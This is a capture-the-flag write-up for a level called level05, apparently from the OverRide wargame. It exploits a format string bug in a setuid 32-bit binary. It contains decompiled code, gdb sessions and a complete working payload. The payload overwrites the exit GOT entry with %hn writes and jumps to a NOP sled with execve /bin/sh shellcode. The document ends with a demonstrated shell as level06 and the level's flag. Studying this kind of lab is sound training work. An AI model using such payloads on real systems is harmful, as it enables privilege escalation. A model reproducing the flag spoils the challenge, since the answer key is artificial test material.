# level05

## General Informations 

**Path** : `/home/users/level05/level05` </br>
**File** : 
```
level05: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x1a9c02d3aeffff53ee0aa8c7730cbcb1ab34270e, not stripped
```
**Permissions**: `-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05`  </br>
**Protections**:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level05
```

## Static Analysis

After decompiling the binary in ghidra, we get the pseudo code below: 

```
void main(void)
{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  byte bVar4;
  byte buffer [100];
  uint i;
  
  bVar4 = 0;
  i = 0;
  fgets((char *)buffer,100,stdin);
  do {
    uVar2 = 0xffffffff;
    pbVar3 = buffer;
    do {
      if (uVar2 == 0) break;
      uVar2 = uVar2 - 1;
      bVar1 = *pbVar3;
      pbVar3 = pbVar3 + (uint)bVar4 * -2 + 1;
    } while (bVar1 != 0);
    if (~uVar2 - 1 <= i) {
      printf((char *)buffer);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (('@' < (char)buffer[i]) && ((char)buffer[i] < '[')) {
      buffer[i] = buffer[i] ^ 0x20;
    }
    i = i + 1;
  } while( true );
}
```

`main`
  - Stores the user input in a 100 bytes buffer using `fgets`, which is secure.
  - Enters an infinite loop:
    - For each character in the buffer: if it's between `@` and `[`, it gets XOR with 0x20 `(buffer[i] ^= 0x20)`.
    - The buffer is then printed with `printf` as part of the exit condition.

The `printf` function uses user input (the buffer) directly as its format string, making the program vulnerable to a format string exploit.
We can exploit this vulnerability to overwrite the entry of the `exit` function in the GOT, since the binary has no `RELRO` protection.

## Vulnerability found  

The `printf` takes directly the user input (buffer) as argument, making it vulnerable to format string exploit. 

## Dynamic Analysis

To begin, we set breakpoints and determine the offset of our input:
```
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) b *0x08048507
(gdb) r < <(python -c 'print "AAAA" + " %p"*10')
...
(gdb) x 0xffffd5b8
0xffffd5b8:	0x61616161
...
aaaa 0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffd664 (nil) 0x61616161
```

The offset is 10 and starts at `0xffffd5b8`.
Now let’s overwrite the `exit` GOT entry with an address pointing to our shellcode stored in the buffer.
```
(gdb) x 0x80497e0
0x80497e0 <exit@got.plt>:	0x08048376
```

`0x80497e0` is the entry in the GOT for `exit`, we will overwrite this address by an address in the buffer pointing to a shellcode.
```
(gdb) x/40x $esp 
...
0xffffd5b0:	0xffffd664	0x00000000	0x61616161	0x61616161
0xffffd5c0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd5d0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd5e0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd5f0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd600:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd610:	0x61616161	0x61616161	0x00616161	0x00000063
...
(gdb) x 0xffffd5b8 + 50
0xffffd5ea:	0x61616161
```

The GOT entry for `exit` is at `0x80497e0`. The buffer spans from `0xffffd5b8` to `0xffffd61c`, we'll target an address like `0xffffd5ea` in the middle of that range and overwrite `exit@got` with this value.

Shellcode: `\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80` </br>

We slice `0xffffd5c0` in two and calcul the number of characters to print for each part:
- `0xd5ea = 54762`, where we substract the 2 the addresses,`54762 - 8 = 54754`
- `0xffff = 65535`, the rest of the characters to print will be `65535 - 54762 = 10773`

It gives us:
```
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54754X" + "%10$hn" + "%10773X" + "%11$hn"'
```

Next, we add a NOP sled followed by the shellcode:
```
(gdb) r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54754X" + "%10$hn" + "%10773X" + "%11$hn" + "\x90"*(100 - (34 + 23)) + "\x31\xc9\xf7\xe1\xb0\x0b\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
...
f7fcfac0�process 2385 is executing new program: /bin/dash
```

It works ! 


## Payload construction 

First write the address to overwrite, followed by the offset:
```
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%10$hn" + "%11$hn"
```

Next we add a padding with the right number of characters to precisely control the written value (using format string specifiers `"%hn"`).
```
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54754X" + "%10$hn" + "%10773X" + "%11$hn"
```

Finally, append the shellcode preceded by a NOP sled to increase the success rate:
```
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54754X" + "%10$hn" + "%10773X" + "%11$hn" + "\x90"*(100 - (34 + 23)) + "\x31\xc9\xf7\xe1\xb0\x0b\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'
```


## Demonstration 

```
level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54754X" + "%10$hn" + "%10773X" + "%11$hn" + "\x90"*(100 - (34 + 23)) + "\x31\xc9\xf7\xe1\xb0\x0b\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'; cat) | ./level05
f7fcfac0�whoami
level06
```

## Flag 
```
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```